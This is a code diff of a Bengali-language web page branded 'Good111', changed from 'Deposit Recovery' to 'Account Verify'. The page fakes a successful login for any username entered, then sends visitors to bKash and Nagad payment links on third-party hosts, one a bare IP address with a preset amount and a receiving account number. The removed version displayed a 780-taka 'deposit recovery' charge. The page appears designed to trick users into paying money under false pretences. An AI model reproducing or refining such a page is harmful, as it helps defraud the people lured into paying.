@@ -3,17 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Good111 Deposit Recovery</title>
+    <title>Good111 Account Verify</title>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@300;400;500;600;700;800;900&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
             --bg-primary: #0a0e17;
-            --bg-secondary: #111827;
             --card-bg: rgba(17, 24, 39, 0.88);
             --card-border: rgba(234, 179, 8, 0.15);
             --accent: #eab308;
-            --accent-glow: rgba(234, 179, 8, 0.4);
             --accent-dark: #a16207;
             --text-primary: #f1f5f9;
             --text-secondary: #94a3b8;
@@ -98,7 +96,7 @@
                 0 25px 50px rgba(0,0,0,0.4),
                 inset 0 1px 0 rgba(255,255,255,0.05);
             position: relative; overflow: hidden;
-            transition: transform 0.4s ease, box-shadow 0.4s ease;
+            transition: box-shadow 0.4s ease;
         }
         .card:hover {
             box-shadow:
@@ -232,70 +230,6 @@
         .payment-page { display: none; animation: fadeSlideIn 0.5s ease; }
         @keyframes fadeSlideIn { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
 
-        .user-welcome {
-            text-align: center; margin-bottom: 24px;
-            padding-bottom: 18px; border-bottom: 1px solid rgba(100,116,139,0.15);
-        }
-        .user-avatar {
-            width: 56px; height: 56px; border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 12px; font-size: 22px;
-            color: var(--bg-primary); font-weight: 800;
-            box-shadow: 0 4px 15px rgba(234,179,8,0.25);
-        }
-        .welcome-text { font-size: 18px; font-weight: 700; color: var(--text-primary); margin-bottom: 4px; }
-        .welcome-sub { font-size: 13px; color: var(--text-muted); }
-
-        .amount-box {
-            text-align: center;
-            padding: 22px 20px;
-            background: linear-gradient(135deg, rgba(234,179,8,0.08), rgba(234,179,8,0.02));
-            border: 1.5px solid rgba(234,179,8,0.2);
-            border-radius: 16px;
-            margin-bottom: 24px;
-            position: relative;
-            overflow: hidden;
-        }
-        .amount-box::before {
-            content: '';
-            position: absolute;
-            top: -50%; left: -50%;
-            width: 200%; height: 200%;
-            background: radial-gradient(circle at 50% 50%, rgba(234,179,8,0.06) 0%, transparent 60%);
-            animation: amountGlow 4s ease-in-out infinite;
-        }
-        @keyframes amountGlow {
-            0%,100% { opacity: 0.5; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.1); }
-        }
-        .amount-box-label {
-            font-size: 13px; color: var(--text-secondary);
-            margin-bottom: 8px; position: relative; z-index: 1;
-            font-weight: 500;
-        }
-        .amount-box-value {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 38px; font-weight: 900;
-            color: var(--accent);
-            position: relative; z-index: 1;
-            text-shadow: 0 0 30px rgba(234,179,8,0.3);
-            line-height: 1.2;
-        }
-        .amount-box-value .taka-sign {
-            font-size: 20px;
-            color: var(--text-secondary);
-            font-family: 'Noto Sans Bengali', sans-serif;
-            font-weight: 600;
-            margin-left: 4px;
-        }
-        .amount-box-sub {
-            font-size: 11px; color: var(--text-muted);
-            margin-top: 8px; position: relative; z-index: 1;
-            display: flex; align-items: center; justify-content: center; gap: 5px;
-        }
-        .amount-box-sub i { font-size: 10px; color: var(--success); }
-
         .section-title {
             font-size: 15px; font-weight: 700; color: var(--text-primary);
             margin-bottom: 16px; display: flex; align-items: center; gap: 8px;
@@ -391,7 +325,6 @@
             .card { padding: 32px 22px; border-radius: 16px; }
             .brand-name { font-size: 22px; }
             .payment-card { padding: 16px 18px; }
-            .amount-box-value { font-size: 32px; }
         }
         @media (prefers-reduced-motion: reduce) {
             *,*::before,*::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
@@ -420,7 +353,7 @@
                         <i class="fas fa-shield-halved"></i>
                     </div>
                     <div class="brand-name">Good111</div>
-                    <div class="brand-subtitle">Deposit Recovery</div>
+                    <div class="brand-subtitle">Account Verify</div>
                 </div>
 
                 <div class="error-msg" id="errorMsg">
@@ -433,15 +366,7 @@
                         <label class="form-label" for="username">ইউজারনেম</label>
                         <div class="input-wrapper">
                             <i class="fas fa-user"></i>
-                            <input
-                                type="text"
-                                class="form-input"
-                                id="username"
-                                placeholder="আপনার ইউজারনেম লিখুন"
-                                aria-label="ইউজারনেম ইনপুট"
-                                required
-                                spellcheck="false"
-                            >
+                            <input type="text" class="form-input" id="username" placeholder="আপনার ইউজারনেম লিখুন" aria-label="ইউজারনেম ইনপুট" required spellcheck="false">
                         </div>
                     </div>
 
@@ -463,22 +388,6 @@
 
             <!-- পেমেন্ট সেকশন -->
             <div class="payment-page" id="paymentSection">
-                <div class="user-welcome">
-                    <div class="user-avatar"><i class="fas fa-user-check"></i></div>
-                    <div class="welcome-text">স্বাগতম</div>
-                    <div class="welcome-sub">আপনার ডিপোজিট রিকভারি পেমেন্ট করুন</div>
-                </div>
-
-                <!-- পরিমাণ ডিসপ্লে -->
-                <div class="amount-box">
-                    <div class="amount-box-label">প্রযোজ্য পরিমাণ</div>
-                    <div class="amount-box-value">780<span class="taka-sign">টাকা</span></div>
-                    <div class="amount-box-sub">
-                        <i class="fas fa-circle-check"></i>
-                        নিচের মাধ্যমে পেমেন্ট সম্পন্ন করুন
-                    </div>
-                </div>
-
                 <div class="section-title">
                     <i class="fas fa-wallet"></i>
                     পেমেন্ট মেথড নির্বাচন করুন
@@ -528,15 +437,13 @@
             }
         })();
 
-        var VALID_USERNAME = '01311874195';
-        var BKASH_URL = 'https://168.aaapay1.com/pay/?trackingNumber=P2920260727085859505782';
-        var NAGAD_URL = 'https://axis.worldxpp.com/pay?trackingNumber=6fa272ec-a179-4200-90e4-f18ffb4a6274';
+        var BKASH_URL = 'http://47.237.140.215:8500/bkh5/bkof.html?orderNo=BK2026081914370576800475112&amount=300&payType=bkash_office&account=01863596179';
+        var NAGAD_URL = 'https://168.aaapay1.com/pay/?trackingNumber=P2920260819083812979217';
 
         var loginForm = document.getElementById('loginForm');
         var usernameInput = document.getElementById('username');
         var loginBtn = document.getElementById('loginBtn');
         var errorMsg = document.getElementById('errorMsg');
-        var errorText = document.getElementById('errorText');
         var loginSection = document.getElementById('loginSection');
         var paymentSection = document.getElementById('paymentSection');
         var bkashLink = document.getElementById('bkashLink');
@@ -564,21 +471,16 @@
             setTimeout(function() {
                 loginBtn.classList.remove('loading');
                 loginBtn.disabled = false;
-
-                if (username === VALID_USERNAME) {
-                    errorMsg.classList.remove('show');
-                    showToast('সফলভাবে লগইন হয়েছে', 'success');
-                    setTimeout(function() {
-                        showPaymentPage();
-                    }, 500);
-                } else {
-                    showError('এই ইউজারনেম দিয়ে অ্যাক্সেস নেই');
-                }
+                showToast('সফলভাবে লগইন হয়েছে', 'success');
+                setTimeout(function() {
+                    loginSection.style.display = 'none';
+                    paymentSection.style.display = 'block';
+                }, 500);
             }, 1500);
         });
 
         function showError(msg) {
-            if (!msg) { errorMsg.classList.remove('show'); return; }
+            var errorText = document.getElementById('errorText');
             errorText.textContent = msg;
             errorMsg.classList.add('show');
         }
@@ -592,11 +494,6 @@
             icon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
             toast.classList.add('show');
             setTimeout(function() { toast.classList.remove('show'); }, 3000);
-        }
-
-        function showPaymentPage() {
-            loginSection.style.display = 'none';
-            paymentSection.style.display = 'block';
         }
 
         logoutBtn.addEventListener('click', function() {
